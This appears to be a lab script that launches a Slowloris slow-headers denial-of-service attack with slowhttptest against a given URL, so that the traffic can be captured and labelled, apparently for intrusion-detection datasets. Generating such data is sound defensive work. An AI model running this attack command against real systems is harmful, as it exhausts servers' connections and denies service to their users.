#!/usr/bin/env bash
# lab/attacks/dos-slowloris.sh — Slowloris slow-headers DoS.  Label: DoS attacks-Slowloris
# RUN FROM THE ATTACKER HOST. Medium impact (ties up connections) — keep short.
# Pair with:
#   sudo bash lab/capture.sh --label "DoS attacks-Slowloris" --duration 60 --attacker-ip <this host>
set -euo pipefail
TARGET="${1:?usage: dos-slowloris.sh <http(s)://host> [seconds]}"
SECS="${2:-40}"
command -v slowhttptest >/dev/null || { echo "need slowhttptest"; exit 1; }
echo "slowloris $TARGET for ${SECS}s ..."
slowhttptest -c 500 -H -i 10 -r 50 -t GET -u "$TARGET" -x 24 -p 3 -l "$SECS" || true
echo "done."
